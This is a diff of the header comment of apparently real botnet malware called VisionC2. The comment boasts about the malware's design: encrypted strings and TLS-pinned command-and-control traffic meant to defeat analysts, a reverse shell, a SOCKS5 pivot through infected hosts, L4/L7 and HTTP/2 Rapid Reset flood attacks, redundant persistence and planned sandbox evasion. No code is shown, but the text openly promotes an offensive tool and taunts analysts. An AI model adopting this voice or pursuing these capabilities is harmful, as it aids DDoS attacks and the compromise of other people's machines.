@@ -1,12 +1,20 @@
 // ============================================================================
-//		
-//   WIP/INCOMING FEATURES: Mirai/Bot Killer, Nanosecond Sandbox Check; 
+// 	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢀⢀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡴⠰⠞⠿⠛⠁⠓⠖⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⢸⠆⢁⠶⠿⠇⠹⠁⠸⠷⠏⣈⡀⢰⠀⠈⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⡁⠴⠛⢀⡀⠀⠀⢀⠀⠀⠀⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠠⠀⢠⣴⣿⠀⠄⠈⠉⠀⠀⢀⠀⢻⡗⠀⠀⠐⠡⣄⡀⠀⠀⠀⠀				VisionC2
+// ⠀⠀⠀⠀⠀⣤⠒⢺⣿⣿⣆⠙⠄⢤⠠⠔⠘⢢⣞⠋⠀⢀⣰⣧⣬⡇⠀⠀⠀⠀					@Syn2Much
+// ⠀⠀⠀⠀⠈⠪⡅⠲⢿⢽⣿⣿⣶⣶⣦⣶⣿⠇⠴⠋⠍⢉⣹⣿⠿⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠰⠆⠁⠀⢈⠉⠹⣹⠈⠁⠀⠆⢰⢆⢀⣾⣾⠉⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠷⠀⠄⣤⡀⠀⣠⠠⣤⠄⠼⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+//   WIP/INCOMING FEATURES: Mirai/Bot Killer, Nanosecond Sandbox Check, Complete Random XOR/AES Keys Per Build; 
 // ============================================================================
 //
-//  Listen I pulled apart dozens of Mirai variants line by line. I read every Xlabs
-//  and Krebs post about Unix Backdoors I could. I watched script kiddies get their C2
-//  address decrypted in a hour by some random blog writer claiming to be a "whitehat".
-//	Those shitty little XOR tables are no better then plaintext.
+//  For months I pulled apart dozens of Mirai variants line by line. I read every Xlabs
+//  and Krebs post about Unix Backdoors that existed. I watched script kiddies get their C2
+//  address decrypted in a hour by some random blog writer claiming to be a "researcer".
 //  We can do so much better. That's why I built Vision to survive anaylsis. 
 //
 //  Every string in this binary is encrypted. AES-128-CTR. Zero plaintext.
@@ -16,7 +24,7 @@
 //  Comms are TLS-pinned server cert fingerprint baked into the binary. You
 //  MITM this and the handshake dies before you see anything. Run wireshark on us
 //  you'll get a bunch of encrypted garbage back over port 443. 
-
+//
 //  HMAC challenge-response. Server sends a nonce, bot proves it knows the key without ever sending it. No key, no joining the c2.
 //  Replay old auth? Nonce is fresh every session. This isn't Mirai's plaintext
 //  password-over-TCP clown show.
@@ -28,9 +36,8 @@
 //  and lets you waste your time staring at nothing.
 //
 //  The payload suite is disgusting. Full reverse shell with output capture.
-//  SOCKS5 proxy with auth pivot through the infected host like it's your
-//  personal VPS. L4 and L7 flood engine with session-aware HTTP/2. 
-//  Plus who the hell else has Rapid Reset CVE as a method on thier net?
+//  SOCKS5 proxy with auth. Pivot through the infected host like it's your
+//  personal VPS. L4 and L7 flood engine with session-aware HTTP/2, Proxy Support, Rapid Reset, CF Bypass, ETC. 
 //
 //  It locks to a single instance. It reaps old PIDs so
 //  there's never two of it running. And persistence? Triple redundant —
@@ -38,10 +45,7 @@
 //  clean two, the third is already running.
 //
 //  
-//  You want to understand botnets? Don't read a paper. Build one. Rip the
-//  entire architecture apart and put it back together with your own hands
-//  until every syscall, every socket option, every evasion technique lives
-//  in your muscle memory. Every layer of obfuscation is a middle finger to every analyst 
+//  Every layer of obfuscation is a middle finger to every analyst 
 //  who thought they'd have an easy day. That's what this is.
 //
 //										
